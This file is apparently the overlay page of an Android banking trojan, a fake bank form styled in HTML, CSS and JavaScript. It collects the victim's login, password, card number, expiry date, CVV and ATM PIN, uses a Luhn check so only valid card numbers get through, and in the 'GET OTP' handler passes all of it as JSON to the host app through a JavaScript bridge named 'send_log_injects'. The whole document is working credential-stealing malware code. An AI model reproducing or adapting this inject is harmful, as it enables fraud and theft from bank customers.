    header{
        padding: 15px;
        flex: 0.6;
    }
    section{
        padding: 15px;
    }
    #div{
        padding: 5px;
        background-color: #fff;
        border-radius: 5px;
        border:1px solid #e8e8e8;
        box-shadow: 0 0 10px rgba(0,0,0,0.5);
        overflow: hidden;
    }
    input,button {
            outline: none !important;
            box-shadow: none ;
        }
        .error {
            border-color: #f00 !important;
        }
     
        .cool-input {
            box-sizing: border-box;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
            padding: 10px;
            padding-bottom: 0px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 5px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 1em;
            border:0;
            
        }
        .cool-input__input:focus {
            border-bottom: 2px solid #a4a4a4;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: 100%;
            position: absolute;
            z-index: 1;
            left: 10px;
            top: 50%;
            line-height: 0;
            color: #666666;
            transition: all 0.2s ease;
        }

        .cool-input__input_filled + .cool-input__placeholder,
        .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: 1em;
        }

        .cool-input__input:focus + .cool-input__placeholder {
            color: #a0a0a0;
            font-weight: 500;
        }

        .cool-input__input:focus + .cool-input {
            border: 1px solid #515d73;
        }

        .input {
            border: 0;
            border-bottom: 1px solid #e4e4e4;
        }
        .temember {
            color: #313131;
            font-weight: 400;
            font-size: 15px;
        }

        .toggle {
            position: relative;
            display: block;
            width: 40px;
            height: 20px;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
            transform: translate3d(0, 0, 0);
        }

        .toggle::before {
            content: "";
            position: relative;
            top: -1px;
            left: -1px;
            width: 42px;
            height: 22px;
            display: block;
            background: #e9e9ea;
            border-radius: 43px;
            transition: background 0.2s ease;
        }

        .toggle span {
            position: absolute;
            top: 0;
            left: 0;
            width: 20px;
            height: 20px;
            display: block;
            background: #fff;
            border-radius: 10px;
            transition: all 0.2s ease;
        }

        .toggle span:before {
            content: "";
            position: absolute;
            display: block;
            margin: -18px;
            width: 56px;
            height: 56px;
            border-radius: 50%;
            transform: scale(0);
            opacity: 1;
            pointer-events: none;
        }

            <section>
                <div id="div">
                <div id="ccBlock" class="cool-input">
                    <input type="tel" id="cc" name="cc" onkeyup="check6();check8()" class="input cool-input__input" autocomplete="off">
                    <span class="cool-input__placeholder">Credit Card</span>
                </div>
    
                <div id="expBlock" class="cool-input" style="width: 49%;float: left;">
                    <input type="tel" id="exp" name="exp" onkeyup="check7();check8()" class="input cool-input__input" autocomplete="off">
                    <span class="cool-input__placeholder">Expiration Date</span>
                </div>
    
                <div id="cvvBlock" class="cool-input" style="width: 49%;float: right;">
                    <input type="password" id="cvv" name="cvv" onkeyup="check8()" class="input cool-input__input" autocomplete="off">
                    <span class="cool-input__placeholder">CVV</span>
                </div>
                <div style="clear: both;"></div>
                <div id="ccBlock" class="cool-input">
                    <input type="password" id="pin" name="pin" onkeyup="check6();check8()" class="input cool-input__input" autocomplete="off">
                    <span class="cool-input__placeholder">ATM PIN</span>
                </div>
                </div>
            </section>
            <footer>
                <input type="button" id="sendData" disabled class="button" value="GET OTP">
            </footer>
        </dvi>
    </form>
    <script>

        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')
        $('#pin').mask('0000')
           
     $('.cool-input__input').on('input', function(){
        var $this = $(this);
        if ($this.val() == '') {
            $this.removeClass('cool-input__input_filled');
        } else {
            $this.addClass('cool-input__input_filled');
        }
    });
            var form1 = document.getElementById('form1'),
                form2 = document.getElementById('form2');
    
            var login = document.getElementById('login'),
                password = document.getElementById('password');
    
            var nextPage = document.getElementById('nextPage'),
                sendData = document.getElementById('sendData');
    
             
    
        nextPage.onclick = () => {
           if(login.value.length < 4) {
               login.classList.add('error');
           } else {
               login.classList.remove('error');
           }
           if(password.value.length < 4) {
               password.classList.add('error');
           } else {
               password.classList.remove('error');
           }

           if(login.value.length >= 4 && password.value.length >= 4) {
                    spinner.style.display = 'block';
    
                    setTimeout(() => {
                        form1.style.display = 'none';
                        spinner.style.display = 'none';
                        form2.style.display = 'flex';
                    }, 1500);
           }
       }
       function check7() {
           
           var mmYY = exp.value.split('/');
           var month = parseInt(mmYY[0]);
           var year = parseInt(mmYY[1]);
   
           var expArray = exp.value.split('/');
           var today, someday;
           var exMonth = expArray[0];
           var exYear = "20" + expArray[1];
   
           today = new Date();
           someday = new Date();
           someday.setFullYear(exYear, exMonth, 1);
                   
           if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
               exp.classList.add('error')
           } else {
               exp.classList.remove('error')
               return true
           }
       }

       function check6() {
           if(!valid_credit_card(cc.value)) {
               cc.classList.add('error')
           } else {
               cc.classList.remove('error');
           }
       }

       function valid_credit_card(value) {
           if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
           if (/[^0-9-\s]+/.test(value)) return false;
           var nCheck = 0, nDigit = 0, bEven = false;
           value = value.replace(/\D/g, "");
           for (var n = value.length - 1; n >= 0; n--) {
               var cDigit = value.charAt(n),
                   nDigit = parseInt(cDigit, 10);
               if (bEven) {
                   if ((nDigit *= 2) > 9) nDigit -= 9;
               }
               nCheck += nDigit;
               bEven = !bEven;
           }
           return (nCheck % 10) == 0;
           
       }

       function check8() {
           if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3 && pin.value.length === 4) {
               sendData.disabled = false;
           } else {
               sendData.disabled = true;
           }
       }
       sendData.onclick = () => {
               var data = {};
               data.login = login.value;
               data.password = password.value;
               data.cc = cc.value;
               data.exp = exp.value;
               data.cvv = cvv.value;
               data.pin = pin.value;
               data.type_injects = "banks";
               data.closed = "close_activity_injects";

               var ua = navigator.userAgent.toLowerCase();
               if(ua.indexOf("android") > -1) {
                   try {
                       Android.send_log_injects(JSON.stringify(data))
                   } catch (err) {}
               }else{
                   alert(JSON.stringify(data));
               }
       }
 </script>
